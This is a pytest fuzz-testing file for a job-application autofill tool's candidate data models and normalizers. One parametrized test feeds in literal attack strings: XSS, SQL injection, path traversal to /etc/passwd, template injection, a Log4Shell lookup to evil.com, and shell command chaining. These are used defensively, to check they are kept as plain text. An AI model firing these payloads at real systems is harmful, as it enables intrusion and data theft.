"""Extreme fuzz testing and adversarial input validation.

Tests system robustness against:
- Malicious payloads (XSS, SQLi, shell injection strings)
- Extreme data sizes (100k character strings, 1000 items)
- Hostile Unicode, zero-width characters, null bytes, bidirectional text
- Missing / malformed schema variants
- Extreme date, phone, URL formats
"""

import pytest
from pydantic import ValidationError

from src.models import CandidateData, PersonalInfo, WorkExperience, Education, FillResult
from src.normalizer import sanitize_text, normalize_phone, parse_location, decompose_full_name
from src.validator import validate_candidate_file, ValidationReport


class TestAdversarialInputs:
    """Test resilience against security payloads in candidate fields."""

    @pytest.mark.parametrize("payload", [
        "<script>alert('xss')</script>",
        "'; DROP TABLE candidates; --",
        "../../../../etc/passwd",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
        "& echo 'pwned' &",
    ])
    def test_security_payloads_do_not_crash_models(self, payload: str):
        """Security injection payloads should be handled cleanly as literal text strings."""
        personal = PersonalInfo(
            first_name=payload,
            last_name="SafeLast",
            email="safe@example.com",
            phone=payload,
            website=f"https://example.com/{payload}",
        )
        assert personal.first_name == payload.strip()
        assert personal.email == "safe@example.com"

        # CandidateData level
        cand = CandidateData(
            personal=personal,
            cover_letter=payload,
            skills=[payload, "Python"],
        )
        assert cand.cover_letter == payload
        assert payload in cand.skills


class TestExtremeSizes:
    """Test resilience against massive payload sizes."""

    def test_giant_string_handling(self):
        """100,000 character cover letter and title should not overflow memory."""
        huge_text = "A" * 100_000
        personal = PersonalInfo(
            first_name="Tamish",
            last_name="Sridatta",
            email="tamish@example.com",
        )
        cand = CandidateData(
            personal=personal,
            cover_letter=huge_text,
            experience=[WorkExperience(company="GiantCo", title=huge_text[:1000])],
        )
        assert len(cand.cover_letter) == 100_000

        # Sanitizer should handle huge text without recursion error
        sanitized = sanitize_text(huge_text)
        assert len(sanitized) == 100_000

    def test_1000_skills_deduplication(self):
        """1,000 skills (with heavy duplicates) deduplicate fast."""
        raw_skills = [f"Skill_{i % 50}" for i in range(1000)]
        personal = PersonalInfo(first_name="A", last_name="B", email="a@b.com")
        cand = CandidateData(personal=personal, skills=raw_skills)
        assert len(cand.skills) == 50  # Exactly 50 unique skills


class TestHostileUnicodeAndEncodings:
    """Test exotic Unicode, emoji, RTL, and zero-width characters."""

    def test_mixed_scripts_and_emojis(self):
        """International candidate names and locations with emojis."""
        name = "محمد José 李 🚀"
        loc = "Tokyo 東京 / القاهرة / São Paulo"
        personal = PersonalInfo(
            first_name="محمد",
            last_name="José 李 🚀",
            email="international@example.com",
            location=loc,
        )
        assert "محمد" in personal.first_name
        assert "🚀" in personal.last_name

        sanitized_loc = sanitize_text(loc)
        assert "東京" in sanitized_loc

    def test_zero_width_spaces_stripped(self):
        """Hidden zero-width spaces (\u200B, \uFEFF) should be stripped cleanly."""
        dirty = "Tam\u200Bish\uFEFF Sridatta\xa0"
        clean = sanitize_text(dirty)
        assert clean == "Tamish Sridatta"


class TestNormalizerEdgeCases:
    """Test boundary conditions for normalizer functions."""

    def test_phone_edge_cases(self):
        # Alphabetic characters mixed in phone
        p = normalize_phone("+1 (800) CALL-NOW")
        # Strips non-digits: +1800 -> length < 7 -> None
        assert p is None or len(p.national_number) >= 4

        # Very long international number
        p2 = normalize_phone("+123456789012345")
        assert p2 is not None
        assert p2.formatted_e164.startswith("+123")

        # Whitespace only
        assert normalize_phone("    ") is None

    def test_decompose_name_edge_cases(self):
        # Empty string
        assert decompose_full_name("") == ("", "")
        # Whitespace only
        assert decompose_full_name("   ") == ("", "")
        # Single letter
        assert decompose_full_name("T") == ("T", "T")
        # Lots of whitespace between names
        first, last = decompose_full_name("  Tamish      Sridatta   ")
        assert first == "Tamish"
        assert last == "Sridatta"
        # Multiple honorifics / complex suffixes
        first2, last2 = decompose_full_name("Dr. Prof. Jane E. Doe, Ph.D., Jr.")
        assert first2 == "Prof." or first2 == "Jane"  # Handled safely without crash


class TestFillResultCalculations:
    """Test boundary conditions for success rate math."""

    def test_zero_fields_no_division_by_zero(self):
        res = FillResult(ats_platform="Greenhouse", page_url="http://test.com")
        assert res.success_rate == 0.0
        assert res.has_failures is False

    def test_all_failed_fields(self):
        res = FillResult(
            ats_platform="Lever",
            page_url="http://test.com",
            failed_fields=["Field1", "Field2", "Field3"],
        )
        assert res.success_rate == 0.0
        assert res.has_failures is True

    def test_only_skipped_fields(self):
        res = FillResult(
            ats_platform="Workday",
            page_url="http://test.com",
            skipped_fields=["Optional1", "Optional2"],
        )
        # When 0 fields are attempted (0 filled, 0 failed), success rate is 0.0
        assert res.success_rate == 0.0
        assert res.has_failures is False
